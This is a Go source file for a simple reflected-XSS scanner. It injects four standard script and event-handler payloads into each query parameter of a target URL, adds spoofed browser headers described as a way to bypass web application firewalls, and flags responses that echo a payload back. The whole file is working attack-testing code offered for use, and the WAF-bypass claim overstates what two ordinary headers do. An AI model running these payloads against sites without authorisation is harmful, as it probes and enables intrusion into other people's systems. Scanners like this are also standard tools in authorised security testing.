package main

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"io/ioutil"
	"sync"
	"time"
	"log"
)

// XSS payloads to test
var payloads = []string{
	"<script>alert('XSS')</script>",
	"<img src=x onerror=alert('XSS')>",
	"'><script>alert('XSS')</script>",
	"<svg/onload=alert('XSS')>",
}

// Custom headers to bypass WAFs
var headers = map[string]string{
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Referer": "https://example.com",
}

func scanURL(target string, wg *sync.WaitGroup) {
	defer wg.Done()
	parsedURL, err := url.Parse(target)
	if err != nil {
		log.Println("Invalid URL:", target)
		return
	}

	q := parsedURL.Query()
	for param := range q {
		for _, payload := range payloads {
			q.Set(param, payload)
			parsedURL.RawQuery = q.Encode()

			req, err := http.NewRequest("GET", parsedURL.String(), nil)
			if err != nil {
				log.Println("Request creation failed:", err)
				continue
			}

			// Add custom headers
			for k, v := range headers {
				req.Header.Set(k, v)
			}

			client := &http.Client{Timeout: 10 * time.Second}
			resp, err := client.Do(req)
			if err != nil {
				log.Println("Request failed:", err)
				continue
			}
			defer resp.Body.Close()

			body, _ := ioutil.ReadAll(resp.Body)
			if strings.Contains(string(body), payload) {
				fmt.Printf("[+] Possible Reflected XSS in %s with payload: %s\n", parsedURL.String(), payload)
			}
		}
	}
}

func main() {
	var target string
	fmt.Print("Enter target URL: ")
	fmt.Scanln(&target)

	var wg sync.WaitGroup
	wg.Add(1)
	go scanURL(target, &wg)
	wg.Wait()
}
